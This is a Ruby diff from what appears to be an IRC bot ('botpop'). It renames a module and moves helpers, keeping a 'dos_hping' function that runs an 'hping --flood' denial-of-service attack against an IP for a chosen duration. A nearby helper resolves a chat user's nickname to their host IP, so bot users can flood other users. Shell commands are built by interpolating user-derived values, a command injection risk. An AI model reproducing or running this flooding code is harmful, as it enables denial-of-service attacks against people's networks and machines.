@@ -1,10 +1,6 @@
-# encoding: utf-8
+#encoding: utf-8
 
-module Action
-
-  def self.dos(ip, duration)
-    `timeout #{duration} hping --flood '#{ip}' 2>&1`
-  end
+module NetworkBase
 
   def self.ping(ip)
     Net::Ping::External.new(ip).ping?
@@ -18,16 +14,12 @@ module Action
     `tracepath '#{ip}'`.to_s.split("\n")
   end
 
-  def self.get_msg m
-    URI.encode(m.params[1..-1].join(' ').gsub(/\![^ ]+ /, ''))
-  end
-
-  def self.get_ip m
-    m.params[1..-1].join(' ').gsub(/\![^ ]+ /, '').gsub(/[^[:alnum:]\-\_\.]/, '')
+  def self.dos_hping(ip, duration)
+    `timeout #{duration} hping --flood '#{ip}' 2>&1`
   end
 
   def self.get_ip_from_nick m
-    nick = get_ip m
+    nick = BotpopHelper::get_ip m
     ip = m.target.users.keys.find{|u| u.nick == nick rescue nil}.host rescue nil
     return {nick: nick, ip: ip}
   end
